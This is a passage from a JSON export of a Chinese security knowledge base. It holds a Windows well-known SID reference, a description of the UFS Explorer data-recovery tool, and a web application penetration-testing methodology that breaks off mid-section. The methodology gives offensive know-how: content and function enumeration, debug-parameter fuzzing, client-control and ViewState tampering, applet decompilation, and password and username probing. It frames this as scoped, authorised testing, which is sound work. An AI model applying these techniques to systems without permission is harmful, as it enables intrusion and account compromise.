0x000001F4 域中的管理用户帐户。 DOMAIN_USER_RID_GUEST 0x000001F5 域中的来宾用户帐户。没有账号的用户可以自动登录这个账号。 DOMAIN_GROUP_RID_ADMINS 0x00000200 域管理员组。此帐户仅存在于运行服务器操作系统的系统上。 DOMAIN_GROUP_RID_USERS 0x00000201 包含域中所有用户帐户的组。所有用户都会自动添加到该组。 DOMAIN_GROUP_RID_GUESTS 0x00000202 域中的来宾组帐户。 DOMAIN_GROUP_RID_COMPUTERS 0x00000203 域计算机组。域中的所有计算机都是该组的成员。 DOMAIN_GROUP_RID_CONTROLLERS 0x00000204 域控制器组。域中的所有 DC 都是该组的成员。 DOMAIN_GROUP_RID_CERT_ADMINS 0x00000205 证书发布者组。运行证书服务的计算机是该组的成员。 DOMAIN_GROUP_RID_ENTERPRISE_READONLY_DOMAIN_CONTROLLERS 0x000001F2 企业只读域控制器组。 DOMAIN_GROUP_RID_SCHEMA_ADMINS 0x00000206 模式管理员组。该组的成员可以修改 Active Directory 架构。 DOMAIN_GROUP_RID_ENTERPRISE_ADMINS 0x00000207 企业管理员组。该组的成员可以完全访问 Active Directory 林中的所有域。企业管理员负责林级操作，例如添加或删除新域。 DOMAIN_GROUP_RID_POLICY_ADMINS 0x00000208 策略管理员组。 DOMAIN_GROUP_RID_READONLY_CONTROLLERS 0x00000209 只读域控制器组。 DOMAIN_GROUP_RID_CLONEABLE_CONTROLLERS 0x0000020A 可克隆域控制器组。 DOMAIN_GROUP_RID_CDC_RESERVED 0x0000020C 保留的 CDC 组。 DOMAIN_GROUP_RID_PROTECTED_USERS 0x0000020D 受保护的用户组。 DOMAIN_GROUP_RID_KEY_ADMINS 0x0000020E 关键管理员组。 DOMAIN_GROUP_RID_ENTERPRISE_KEY_ADMINS 0x0000020F 企业关键管理员组 以下 RID 用于指定强制完整性级别。\nRID 价值 识别 SECURITY_MANDATORY_UNTRUSTED_RID 0x00000000 不信任。 SECURITY_MANDATORY_LOW_RID 0x00001000 完整性低。 SECURITY_MANDATORY_MEDIUM_RID 0x00002000 中等完整性。 SECURITY_MANDATORY_MEDIUM_PLUS_RID SECURITY_MANDATORY_MEDIUM_RID + 0x100 中高完整性。 SECURITY_MANDATORY_HIGH_RID 0X00003000 诚信度高。 SECURITY_MANDATORY_SYSTEM_RID 0x00004000 系统完整性。 SECURITY_MANDATORY_PROTECTED_PROCESS_RID 0x00005000 受保护的过程。 下表包含域相关 RID 的示例，您可以使用这些示例为本地组（别名）形成众所周知的 SID。有关本地和全局组的更多信息，请参阅本地组函数和组函数。\nRID 价值 字符串值 识别 DOMAIN_ALIAS_RID_ADMINS 0x00000220 S-1-5-32-544 用于管理域的本地组。 DOMAIN_ALIAS_RID_USERS 0x00000221 S-1-5-32-545 代表域中所有用户的本地组。 DOMAIN_ALIAS_RID_GUESTS 0x00000222 S-1-5-32-546 代表域来宾的本地组。 DOMAIN_ALIAS_RID_POWER_USERS 0x00000223 S-1-5-32-547 一个本地组，用于代表希望将系统视为他们的个人计算机而不是多个用户的工作站的一个用户或一组用户。 DOMAIN_ALIAS_RID_ACCOUNT_OPS 0x00000224 S-1-5-32-548 仅存在于运行服务器操作系统的系统上的本地组。此本地组允许控制非管理员帐户。 DOMAIN_ALIAS_RID_SYSTEM_OPS 0x00000225 S-1-5-32-549 仅存在于运行服务器操作系统的系统上的本地组。该本地组执行系统管理功能，不包括安全功能。它建立网络共享、控制打印机、解锁工作站和执行其他操作。 DOMAIN_ALIAS_RID_PRINT_OPS 0x00000226 S-1-5-32-550 仅存在于运行服务器操作系统的系统上的本地组。此本地组控制打印机和打印队列。 DOMAIN_ALIAS_RID_BACKUP_OPS 0x00000227 S-1-5-32-551 用于控制文件备份和恢复权限分配的本地组。 DOMAIN_ALIAS_RID_REPLICATOR 0x00000228 S-1-5-32-552 负责将安全数据库从主域控制器复制到备份域控制器的本地组。这些帐户仅供系统使用。 DOMAIN_ALIAS_RID_RAS_SERVERS 0x00000229 S-1-5-32-553 代表 RAS 和 IAS 服务器的本地组。该组允许访问用户对象的各种属性。 DOMAIN_ALIAS_RID_PREW2KCOMPACCESS 0x0000022A S-1-5-32-554 仅存在于运行 Windows 2000 Server 的系统上的本地组。有关更多信息，请参阅允许匿名访问。 DOMAIN_ALIAS_RID_REMOTE_DESKTOP_USERS 0x0000022B S-1-5-32-555 代表所有远程桌面用户的本地组。 DOMAIN_ALIAS_RID_NETWORK_CONFIGURATION_OPS 0x0000022C S-1-5-32-556 代表网络配置的本地组。 DOMAIN_ALIAS_RID_INCOMING_FOREST_TRUST_BUILDERS 0x0000022D S-1-5-32-557 代表任何林信任用户的本地组。 DOMAIN_ALIAS_RID_MONITORING_USERS 0x0000022E S-1-5-32-558 代表所有被监控用户的本地组。 DOMAIN_ALIAS_RID_LOGGING_USERS 0x0000022F S-1-5-32-559 负责记录用户的本地组。 DOMAIN_ALIAS_RID_AUTHORIZATIONACCESS 0x00000230 S-1-5-32-560 代表所有授权访问的本地组。 DOMAIN_ALIAS_RID_TS_LICENSE_SERVERS 0x00000231 S-1-5-32-561 仅存在于运行允许终端服务和远程访问的服务器操作系统的系统上的本地组。 DOMAIN_ALIAS_RID_DCOM_USERS 0x00000232 S-1-5-32-562 代表可以使用分布式组件对象模型 (DCOM) 的用户的本地组。 DOMAIN_ALIAS_RID_IUSERS 0X00000238 S-1-5-32-568 代表 Internet 用户的本地组。 DOMAIN_ALIAS_RID_CRYPTO_OPERATORS 0x00000239 S-1-5-32-569 代表对密码操作员的访问的本地组。 DOMAIN_ALIAS_RID_CACHEABLE_PRINCIPALS_GROUP 0x0000023B S-1-5-32-571 代表可以缓存的主体的本地组。 DOMAIN_ALIAS_RID_NON_CACHEABLE_PRINCIPALS_GROUP 0x0000023C S-1-5-32-572 代表无法缓存的主体的本地组。 DOMAIN_ALIAS_RID_EVENT_LOG_READERS_GROUP 0x0000023D S-1-5-32-573 代表事件日志阅读器的本地组。 DOMAIN_ALIAS_RID_CERTSVC_DCOM_ACCESS_GROUP 0x0000023E S-1-5-32-574 可以使用分布式组件对象模型 (DCOM) 连接到证书颁发机构的本地用户组。 DOMAIN_ALIAS_RID_RDS_REMOTE_ACCESS_SERVERS 0x0000023F S-1-5-32-575 代表 RDS 远程访问服务器的本地组。 DOMAIN_ALIAS_RID_RDS_ENDPOINT_SERVERS 0x00000240 S-1-5-32-576 代表端点服务器的本地组。 DOMAIN_ALIAS_RID_RDS_MANAGEMENT_SERVERS 0x00000241 S-1-5-32-577 代表管理服务器的本地组。 DOMAIN_ALIAS_RID_HYPER_V_ADMINS 0x00000242 S-1-5-32-578 代表 hyper-v 管理员的本地组 DOMAIN_ALIAS_RID_ACCESS_CONTROL_ASSISTANCE_OPS 0x00000243 S-1-5-32-579 代表访问控制辅助 OPS 的本地组。 DOMAIN_ALIAS_RID_REMOTE_MANAGEMENT_USERS 0x00000244 S-1-5-32-580 代表远程管理用户的本地组。 DOMAIN_ALIAS_RID_DEFAULT_ACCOUNT 0x00000245 S-1-5-32-581 代表默认帐户的本地组。 DOMAIN_ALIAS_RID_STORAGE_REPLICA_ADMINS 0x00000246 S-1-5-32-582 代表存储副本管理员的本地组。 DOMAIN_ALIAS_RID_DEVICE_OWNERS 0x00000247 S-1-5-32-583 代表的本地组可以为设备所有者进行预期的设置。 该WELL_KNOWN_SID_TYPE枚举定义常用SID列表。此外，安全描述符定义语言(SDDL) 使用SID 字符串以字符串格式引用众所周知的 SID。\n参考：\nhttps://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids\n",
    "description": "",
    "tags": null,
    "title": "SID安全标识符",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/sid%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6/index.html"
  },
  {
    "content": "官网 https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php\n国内常见的支持E01镜像文件访问的软件主要有GetData Mount Image Pro、AccessData FTK Imager和OSFMount等。我们使用GetData Mount Image Pro将镜像文件映射为本地磁盘驱动，然后再将镜像文件中的操作系统加载到虚拟机上运行。\n推荐使用ufs explorer professional recovery.( https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php) 实测好用。\n自述 UFS Explorer Professional Recovery是一款专家级软件工具，旨在解决高度复杂的数据恢复挑战。\n除了线性电子媒体，如硬盘、u盘和存储卡，该程序处理基于RAID的各种布局的存储，包括标准的、嵌套的、自定义的和特定的配置- Drobo BeyondRAID、Synology Hybrid RAID、Btrfs-RAID和ZFS RAID-z。集成的解密算法可以打开用BitLocker、LUKS、FileVault 2和APFS加密的卷，而不必在操作系统中解锁它们。软件还支持许多文件系统用于Windows, Linux, macOS BSD,提供直接访问其内容,以及各种存储技术,包括Windows动态磁盘,存储空间和重复数据删除,苹果软件RAID,核心存储和时间机器,Linux mdadm和自动精简配置LVM。此外，该应用程序允许使用各种虚拟化系统，如VMware、Hyper-V、VirtualBox、QEMU、XEN和许多格式的磁盘映像。\n此外，UFS Explorer专业恢复功能扩展了有效处理存储设备的可能性，特别是那些显示出某些硬件问题的设备。该软件提供了一个先进的程序，可以打开带有使用参数的存储，并有机会用处理后的数据保存稀疏图像文件。与DeepSpar磁盘成像仪连接的驱动器可以通过局域网进行操作，并由软件控制，而不需要任何第三方解决方案。在嵌入式成像功能的帮助下，还可以创建磁盘的完整或部分映像，该功能具有用于磁盘读取和删除损坏块的各种设置。具有缺陷区域的映射可以在成像过程中生成，或通过将已使用/空闲文件系统空间转换为掩模，并在恢复过程中使用。文件和存储的原始内容可以在软件中通过广泛的辅助工具直接分析和编辑。\n特性 增强的存储读取机制\n创建磁盘映像的高级可能性\n支持多种存储技术\n内置磁盘解密技术\n支持不同RAID类型的自动重构\n带有嵌入式脚本处理程序的可调RAID生成器\n综合工具包的工作与缺陷存储\n有效分析和编辑二进制数据的多种手段\n支持的系统环境 软件可以安装在Windows, Apple macOS and Linux\n操作系统： Microsoft Windows ®: Windows ® XP with Service Pack 3 and later\nApple macOS: version 10.9 and above\nLinux: Debian Linux 6.0 (or compatible) and above\n支持的cpu架构 Intel Architecture, 32-bit (IA-32, x86)\nAMD64 (x86-64)\n支持的文件系统 内容访问和数据恢复 Data access and advanced recovery:\nWindows: NTFS, FAT, FAT32, exFAT, ReFS/ReFS3;\nmacOS: HFS+, APFS;\nLinux: Ext2, Ext3, Ext4, XFS, Extended format XFS, JFS, ReiserFS, UFS, UFS2, Adaptec UFS, big-endian UFS, Btrfs, F2FS;\nBSD/Solaris: ZFS volumes;\nVMware: VMFS, VMFS6.\n仅支持数据访问 macOS: HFS;\nNovell: NWFS, NSS, NSS64;\nIBM/Microsoft: HPFS.\n支持虚拟构建、读取和恢复数据 自动识别已知的RAID元数据，保存和编辑RAID配置。\n自动重构LVM, Apple Software RAID, Intel Matrix等。\n支持最流行的RAID模式，如RAID 0, RAID 1E, RAID 3, RAID 5, RAID 6, RAID 7等。\nRAID-on-RAID支持:RAID级别10,50,60,50e等。\n通过RDL或Runtime VIM支持自定义RAID模式支持带ZFS和RAID-Z的“stripe”卷(RAID-Z, RAID-Z2, RAID-Z3)利用坏扇区映射，在出现缺陷(读取错误)时，可自适应重构RAID 5、RAID 6、RAID 5E、RAID 1、RAID 10、RAID0+1和嵌套RAID(级别50、51、60、61等)虚拟磁盘的RAID组件\n支持Drobo BeyondRAID, Synology Hybrid RAID, Btrfs-RAID从降级RAID 5、RAID 10等的Dell EqualLogic存储阵列恢复到双降级RAID 6、RAID 60;卷数据恢复(使用外部数据映射)\n支持软件加密存储 全盘加密\nLUKS（卢卡斯）加密\nApple FileVault 2加密\nApple APFS卷的加密\n文件系统转换(ecryptf)\nBitLocker和BitLocker加密\n支持虚拟技术: VMware VMDK, Hyper-V VHD/VHDX, QEMU/XEN QCOW/QCOW2, VirtualBox VDI, Apple DMG, parallels, EnCase E01和Ex01非加密文件，简单磁盘镜像\n内部稀疏格式\n支持驱动器作为磁盘映像(适用于XEN和其他类型)\nSynology稀疏iSCSI\n以虚拟磁盘的形式在存储器中打开分区/文件\n支持分裂DeepSpar DDI图像\n自定义运行时软件的“虚拟映像”文件\nR-Studio图像文件(RDR文件格式)\n使用外部映射或识别给定模式在磁盘映像上动态定义虚拟坏块\n使用MRT数据恢复工具创建的磁盘映像(将文件映像块排序并组合到一个映像文件中)\n使用手册： 基本使用 https://www.ufsexplorer.com/solutions/recover-deleted-files.php\n此通用方法将帮助您轻松执行该过程并恢复意外删除的文件：\n将UFS资源管理器下载并安装到磁盘上，而不要保留要恢复的一个已删除文件。确保程序的下载版本与将在其上运行的操作系统平台相对应。 如果需要，请运行该应用程序并在设置表中调整软件设置。 连接包含您需要取回的已删除数据的存储设备。您可以选择对您的设备类型有效的任何直接连接类型。 在UFS Explorer的左窗格中的已连接存储列表中选择有问题的设备或逻辑卷，然后使用相应的按钮或存储上下文菜单选项对其进行扫描以查找丢失的数据。 设置所需的扫描参数。如果您希望更快地完成该过程，则可以禁用InelliRAW。按下“开始扫描”按钮，然后等待结果。 浏览该程序找到的文件，然后选择要恢复的文件。您可以按名称，日期，类型对它们进行排序，使用快速和高级搜索选项，也可以在内部查看器中预览它们。 将所选文件保存到备用驱动器，外部存储器或网络位置。目标存储必须不同于从中恢复已删除数据的磁盘。 其他详细信息将取决于您使用的操作系统，设备的类型，或者在某些情况下取决于已删除文件的格式，这些信息在相应的文章中提供。\n参考 https://www.ufsexplorer.com/solutions/recover-deleted-files-windows.php\n",
    "description": "",
    "tags": null,
    "title": "UFS explorer professional recovery(win/mac/linux)",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS-explorer-professional-recoverywinmaclinux/index.html"
  },
  {
    "content": "WEB应用程序渗透测试方法论 指导思想：方法论中一系列任务根据他们之间的逻辑依赖关系组织和排序。实际上，渗透测试过程往往需要发挥自己的想象，思考可采取的攻击方向，并根据所发现的有关目标应用程序的信息指导攻击方向。\n某一个阶段收集到的信息有助于返回到 前一个阶段，以设计更具有针对性的攻击。\n在应用程序的某个区域发现的一个关键漏洞可简化对另一个区域的攻击。\n一些区域的测试结果有助于确定在其他区域可立即探查出的重复出现的漏洞模式。\n一般规范：适用于所有必须测试的区域以及需要采用的各种技巧 假设需要在咨询工作中采用这种方法，渗透测试员应当首先确定测试范围，明确了解测试包含的主机名、URL与功能以及允许执行的测试类型是否存在任何限制。还应当向应用程序所有者告知对一个“黑盒”目标实施任何渗透测试包含的内在风险，并建议他们在开始测试前备份所有重要数据。\n一些字符在HTTP请求（HTTP请求头）的不同部分具有特殊的含义。应对这些字符进行URL编码，以确保应用程序按照想要的方式解释这些字符。 \u0026用于分隔URL查询字符串与消息主体中的参数。要插入一个\u0026字符，必须将其编码为%26. =用于分隔URL查询字符串与消息主体中每个参数的名称和值。要插入一个字面量=字符，必须将其编码为%3d. ?用于标记URL查询字符串的起始位置。要插入一个字面量？字符，必须将其编码为%3f。 空格用于在请求的第一行标记URL的结束位置，并可用于在cookie消息头中表示一个cookie值结束。要插入一个字面变量空格字符，必须将其编码为%20或+。 +表示一个编码的空格，要插入一个字面量+字符，必须将其编码为%2b ;用于在cookie消息头中分隔单个cookie。要插入一个字面量;字符，必须将其编码为%3b #用于在URL中标记片段标识符。如果在浏览器的URL中输入这个字符，它会传给服务器的URL截短。要插入一个字面量#字符，必须将其编码为%23。 %在URL编码方案中作为前缀。要插入一个字面量%字符，必须将其编码为%25。 空字节和换行符等，非打印字符必须使用他们的ASCII字符代码进行URL编码。空字节和换行符的编码分别为%00和%0a。 2. 表单中输入URL编码的数据通常会导致浏览器执行另一层编码。例如，在表单中提交%00可能会导致向服务器发送值%2500。为此，通常最好在拦截代理服务器中查看最终请求。 3. 许多查找常见Web应用程序的测试需要发送各种专门设计的输入字符串，并监控应用程序响应，从中搜索表示漏洞存在的反常现象。判断漏洞存在不应仅判断正向特征，还应包含反向特征比对多角度确认，有时候，无论是否提交某个特定漏洞的触发器，应用程序对一个特殊请求的响应都将包含这个漏洞的签名。只要提交专门设计的特殊输入导致了与某个漏洞相关的行为（如一个特殊的错误消息），应该重新核查，确定在相关参数中提交良性输入是否也会造成相同的行为。 4. 前一个请求数据的返回状态会对接下来的请求以及返回造成影响。有时，当调查一个尚未确定的漏洞并隔离某一个反常行为的根源时，必须避免任何收集到的状态信息造成的影响。通常，使用一个新的浏览器进程开始另一个会话，再使用良性请求导航至观测到发生反常的位置，然后重新提交专门设计的输入，即可。还可以对请求中包含的cookie和缓存信息进行调整，重复利用这种方法。此外，还可以使用burp reqeater等工具隔离一个请求。 5. 一些应用程序使用一种负载平衡的配置，其中连续的HTTP请求可能会被不同的后端服务器在Web层，展现层，数据层或其它层处理。不同服务器在配置上的细微差异可能会影响到处理结果。另外，一些成功的攻击将改变处理请求的某一台服务器的状态，例如在web根目录上创建一个新的文件。为隔离特殊操作造成的影响，可能需要连续提交几个相同的请求，测试每个请求的结果，直到请求被相关服务器处理。 1. 解析应用程序内容 1.1 搜索可见的内容 配置浏览器。BURP、webscarab监控抓包。 如果有用，配置浏览器，使用一个扩展监控和分析被浏览器处理的HTTP与HTML内容。 burp 以常规方式浏览整个应用程序，访问发现的每一个连接和URL,提交每一个表单并执行全部多阶段功能。尝试在JS激活与禁用，Cookie激活与禁用情况下浏览。许多应用程序能够处理各种浏览器配置，渗透测试员可以获得应用程序内的不同内容和代码路径。 如果应用程序使用身份验证，并且渗透测试员已经拥有或可以建立一个登陆账户，那么他应具有账户访问保护功能。 当浏览、监控通过拦截代理服务器的请求与响应时，了解被提交的数据种类，了解客户端如何控制服务器端应用程序的行为。 检查被动抓取生成的站点地图，确定任何尚未使用浏览器访问到的内容或功能。根据抓取结果，确定发现每一项内容的位置。使用浏览器访问以上内容，以便爬虫解析服务器的响应，确定其他任何内容。重复执行上述步骤，知道无法确定其他内容或功能。 完成手动浏览和被动抓取后，可以用一组发现的URL作为种子，使用爬虫抓取应用程序。有时，这样可发现其他在手动浏览时忽略的内容。在进行自动抓取前，首先应确定任何危险的或可能会中断应用程序会话的URL，并配置爬虫，将他们排除在抓取范围之外。 1.2 浏览公共资源 使用因特网搜索引擎和历史档案确定他们编入索引或保存与目标应用程序有关的内容。 使用高级搜索选项提高搜索的效率。例如，在Google中，可以使用site:获取所有与目标站点有关的内容；使用link：获取连接到目标站点的其他站点。如果搜索过程中找到现有应用程序已经删除的内容，仍然可以从搜索引擎的缓存中查看这些内容。这些已被删除的内容中可能包含尚未删除的其他资源的连接。 搜索在应用程序内容，【如联系信息，姓名，身份证号，邮件，地址】。除web搜索外还应进行新闻和分组搜索。在论坛中寻找与目标应用程序及其支持基础架构有关的所有技术信息。 检查已发布的任何WSDL(web服务描述性语言)文件，以生成应用程序可能采用的功能名称和参数值列表。 1.3 发现隐藏的内容 确定应用程序如何处理访问不存在的资源请求。手动提出请求，访问一致有效和无效的资源，比较应用程序对这些请求的响应，找到确定资源不存在的简单方法。 获取常见文件与目录名以及常见的文件扩展名列表。根据存在的名猜测推测可能存在的页面。 审查所有客户端代码，确定任何与服务器端内容（包括html注释和禁用的表单元素）有关的线索。 使用自动化技巧，根据目录名，文件名以及文件扩展名列表大量请求，监控应用的响应，确定存在的可访问的内容。 以枚举内容和模式作为用户指导的抓取以及自动化深入搜索的基础，重复进行内容查找。 1.4 查找默认的内容 针对web服务器运行nikto，探查所有默认或抑制存在的内容。使用nikto的选项提高探查效率。例如，使用-root选项制定查找默认内容的目录，或者使用-404选项指定一个标识定制化“文件未发现”页面的字符串。 手动核查所有可能有用的发现，减少探查结果中的错误警报。 请求服务器的根目录，在host消息头中指定IP地址，确定应用程序是否使用任何不同的内容作出响应。如果是，则针对该IP地址及服务器名称运行Nikto扫描。 向服务器的根目录提出请求，指定一系列User-Agent消息头。 1.5 枚举标识符指定的功能 确定任何通过在请求参数中提交一个功能标识符，访问特殊应用程序功能的情况。传参的参数进行猜测确定。 对用于访问单项功能的机制，应用内容查找技巧。例如，如果应用程序使用一个包含功能名称的参数，首先应该确定指定无效功能时应用程序的行为，设法找到一个确定被请求的功能缺失有效的简单方法。列出常用的功能名称或遍历所使用的标识符的语法范围。使枚举有效功能的操作自动化，使其尽可能迅速高效地完成。 如果适用，根据功能路径而非URL编制一副应用程序内容地图，列出所有枚举出的功能和逻辑路径以及他们之间的依赖关系。 1.6 调试参数 选择一个或几个使用隐藏调试参数（如debug=true)的应用程序页面功能。他们最有可能出现在登录、搜索、文件上传或下载等关键功能中。 使用常用调试参数名（如debug、test、hide和source）与常用参数值（如true、yes、on和1）列表，排出这些名称与值的全部组合，向每一个目标功能提交每个名称参数值对。对于POST请求，在URL查询字符串和请求主体中提交参数。Burp Intruder可以实现自动化。 在应用程序的响应中查找任何表示添加的参数对应用程序的行为造成影响的反常现象。 2. 分析应用程序 2.1 确定功能 确定为使应用程序正常运行而建立的核心功能以及每项功能旨在执行的操作。 确定应用程序采用的核心安全机制以及他们的工作机制。重点了解处理身份验证、会话管理与访问控制的关键机制以及支持他们的功能，如用户注册和账户恢复。 确定所有较为外围的功能和行为，如重定向使用、站外链接、错误消息、管理与日志功能。 确定任何与应用程序在其他地方使用的标准GUI外观、参数命名或导航机制不一致的功能。然后将其挑选出来以进行深入测试。 2.2 确定数据进入点 确定在应用程序中引入用户输入的所有进入点，包括URL/查询子字符串参数、POST数据、cookie与其他由应用程序处理的HTTP消息头。 分析应用程序使用的所有定制数据传输或编码机制，如非常规的检查字符串格式。了解被提交的数据是否包含参数名或参数值，或者是否使用了其他表示方法。 确定所有在应用程序中引入用户可控制或其他第三方数据的带外通道，例如，处理和显示通过SMTP收到的消息的Web邮件应用程序。 2.3 确定所使用的技术 确定客户端使用的各种不同技术，如表单、脚本、cookie、java applet、activeX空间与Flash对象。 尽可能确定服务器端使用的技术，包括脚本语言，应用程序平台以及与数据库和电子邮件系统等后端组件的交互。 检查在应用程序响应中返回的HTTP server消息头，查找指定HTTP消息头或HTML源代码注释中出现的其他任何软件标识符。注意，有时候，不同的应用程序区域由不同的后端组件处理，因此渗透测试员可能会受到不同的标识符。 运行Httprint工具，为web服务器做“指纹标识”。 检查内容解析过程中获得的结果，确定所有有助于了解服务器端所使用的技术的文件扩展名、目录或其它URL序列。检查所有会话令牌和其他cookie的名称。同时，使用Coogle搜索与这些内容有关的技术。 确定任何看似有用的、属于第三方代码组建的脚本名称与查询字符串参数。在Google中使用inurl:限定词搜索这些内容，查找所有适用相同脚本与参数、并因此使用相同第三方组件的应用程序。对这些站点进行非入侵式的审查，这样可能会发现其他在攻击的应用程序中没有明确连接的内容和功能。 2.4 解析受攻击面 设法确定服务器端应用程序的内部结构与功能以及用于实现客户端可见行为的后台机制。例如，获取客户订单的功能可能与数据库进行交互。 确定各种与每一项功能有关的常见漏洞。例如，文件上传功能可能易于受到目录遍历攻击；用户通信可能受到XSS攻击；联络我们功能可能易于受到SMTP注入 攻击。 制定一个攻击计划，优先考虑最有用的功能以及与他有关的最严重的潜在漏洞。使用这份计划作为指导，决定应对本章讨论的方法的其他区域投入多少时间和精力。 3. 测试客户端控件 3.1 通过客户端传送数据 在应用程序中，确定隐藏表单字段、cookie和URL参数明显用于通过客户端传送数据的所有情况。 根据以上数据出现的位置及其名称与值，尝试确定它在应用程序逻辑中发挥的作用。 修改数据在应用程序相关功能中的值。确定应用程序是否处理字段中提交的任意值，以及是否可以通过这样做干扰应用程序的逻辑或破坏任何安全控件。 如果应用程序通过客户端传送模糊数据，渗透测试员可以以各种方式攻击这种传输机制。如果数据被模糊处理，渗透测试员可以破译所使用的模糊算法，从而在模糊数据中提交任意数据。即使它进行了安全加密，仍然可以在其他情况下重新提交这个数据，干扰应用程序的逻辑。 如果应用程序使用ASP.NET ViewState,对其进行测试，确定是否可以破坏它，或者其中是否包含任何敏感信息。注意，不同应用程序页面使用viewstate的方式可能有所不同。 a. 使用BurpSuit中的ViewState分析器确定EnableViewStateMac选项是否被激活该选项表示ViewState的内容不能被修改。 b.审查解码后的ViewState，确定它包含的所有敏感数据。 c. 修改一个被解码的参数值，重新对其编码，然后将它提交给ViewState。如果应用程序接受修改后的参数值，那么应当把ViewState当做在应用程序中引入任意数据的一个输入渠道，并对它包含的数据执行与其他请求参数相同的测试。 3.2 客户端输入控件 在将用户输入提交给服务器之前，确定使用长度限制和JS检查等客户端控件对其进行确认的任何情况。当然，这些客户端控件可悲轻易避开，因为渗透测试员可以向服务器发送任意请求。 通过提交通常被客户端控件阻止的输入，轮流测试每一个受影响的字段，确定服务器是否使用相同的输入确认。 能够避开客户端确认并不表示存在任何漏洞。因此，应该仔细审查应用程序实施的确认机制，弄清应用程序是否依赖客户端控件保护自身，防止畸形输入，以及这些输入是否可触发任何可被利用的条件。 检查每一个HTML表单，确定所有禁用的元素，如灰色提交按钮，例如：。 如果发现任何禁用的元素，就与其他表单参数一起提交这些元素，确定该元素是否会对应用程序的处理逻辑造成影响，渗透测试员可在攻击过程中利用这些影响。或者使用自动糊代理服务器规则，自动启用禁用的字段，如BurpProxy的Response Modification“HTML修改”规则Unhide hidden form fields。 3.3 测试浏览器扩展组件 3.3.1 了解客户端应用程序的操作\n为正在测试的客户端技术设置一个本地拦截代理服务器，并监视客户端与服务器之间的所有流量。如果数据被序列化，可以使用反序列化工具，如Burp内置的AMF支持工具或用于Java的DSerBrup插件。 浏览在客户端中呈现的所有功能。使用拦截代理服务器中的表针工具重新提出关键请求或修改服务器响应，以确定任何可能的米肝功能或强大功能。 3.3.2 反编译客户端\n确定应用程序使用的任何applet。通过拦截代理服务器查找一下请求的任何文件类型：.class/.jar对应JAVA；.swf对应Flash；.xap对应Silverlight。 还可以在应用程序页面的HTML源代码中查找applet标签。例如：\u003c.applet\u003e 分析HTML源代码对applet方法的全部调用情况，并确定applet返回的数据是否被提交到服务器。如果这个数据为模糊数据（即经过模糊处理或加密），那么想要对其进行修改，可能需要反编译applet，获得它的源代码。 在浏览器中输入URL，下载applet字节码，并将文件保存在本地计算机中。字节码文件的名称在applet标签的code属性中指定，该文件将位于codebase属性（如果此属性存在）指定的目录中；否则，它将保存在applet标签出现的页面所在的目录中。 使用适当的工具将字节码反编译成源代码。例如：c:\u003ejad.exe input.class 以下是一些适用于反编译不同浏览器扩展组件的工具 java—-jad flash—swfscan,flasm/flare silerlight—.net reflector 如果applet被压缩成jar,xap或swf文件，可以使用winrar或winzip等解压缩。 分析相关源代码（从执行返回模糊数据的方法的源代码开始），了解应用程序执行了何种处理 确定applet中是否包含任何可用于对任意输入进行相关模糊处理的公共方法。 如果其中没有这类方法，修改applet的源代码，以达到领其执行的任何确认失效或允许模糊处理任意输入的目的。然后可以使用供应商提供的编译工具将源代码重新编译成最初的文件格式。 3.3.3 附加调试器\n对于大型客户端应用程序，要反编译、并修改并重新打包整个应用程序旺旺非常困难，这时会遇到各种错误。通常，对于这些应用程序，在处理时附加运行时调试器会更加容易。JavaSnoop可对Java应用程序执行上述操作。Silverlight Spy是一款免费工具，可对silverlight客户端进行运行时监视。 找到应用程序用于实现安全相关的业务逻辑的关键功能和值，并在调用目标功能时放置断点。根据需要修改参数或返回值，以破坏其安全防御。 3.3.4 测试ActiveX控件\n确定应用程序使用的所有ActiveX控件。寻找通过拦截代理服务器请求的所有.cab文件类型，或者在应用程序页面的HTML源代码中虚招对象标签。例如 通常，可以通过在进程上附加调试器并直接修改被处理的数据，或者改编程序的执行路径，破坏ActiveX控件实施的所有输入确认。 可以根据ActiveX控件导出各种方法的名称以及提交给他们的参数，猜测这些方法的作用。使用COMRaider工具可枚举出ActiveX控件导出的各种方法。测试是否可以操纵这些方法，从而影响控件的行为并避开它执行的所有确认机制。 如果控件的作用是收集或核实某些与客户端计算机有关的信息，就可以使用Filemon与Regmon工具监控控件收集到的信息。通常，可以在系统注册表和文件系统中穿件适当的数据项，修改控件使用的输入，从而影响其行为。 在任何ActiveX控件中探查可用于攻击应用程序其他用户的漏洞。渗透测试者可以修改用于调用控件的HTML代码，向它的方法提交任意数据，并监控处理结果；可以寻找看似危险的方法名，如LaunchExe,还可以使用COMRaider对ActiveX控件进行基本的模糊测试，确定缓冲区溢出之类的漏洞。 3.4 测试验证机制 3.4.1 了解验证机制\n确定应用程序使用的验证技术（如表单、证书或多元机制）。 确定所有与验证有关的功能（如登录、注册、账户恢复等）。 如果应用程序并未采用自动自我注册机制，确定是否可以使用任何其他方法获得几个用户账户。 3.4.2 测试密码强度\n在应用程序中查找有关用户密码最小强度规则的说明。 尝试使用所有自我注册或密码修改功能，设定各种脆弱密码，确定应用程序实际应用的密码强度规则。尝试使用短密码、仅包含字母字符的密码、全部大写或者全部小写字符的密码、单词型密码以及将当前用户名作为密码。 测试不完整的证书确认。设定一个强大并且复杂的密码（例如，密码长度为12个字符，其中包含大小写字母、数字和印刷字符）。尝试用这个密码的各种变化形式登录，如删除最后一个字符，改变字符的大小写，或者删除任何特殊字符。如果其中一些常识取得成功，继续系统性的尝试，了解完整的证书确认过程。 了解最小密码强度规则以及密码确认的程度后，再设法确定密码猜测攻击所需要使用的密码值范围，以提高攻击成功的可能性。尝试找出所有的内置账户，他们可能并不满足标准密码复杂度要求。 3.4.3 测试用户名枚举\n确定各种验证功能通过在屏幕上显示的输入字段、隐藏表单字段或者cookie提交用户名的每一个位置。这些位置通常存在于登录、注册、密码修改、退出与账户恢复功能中。 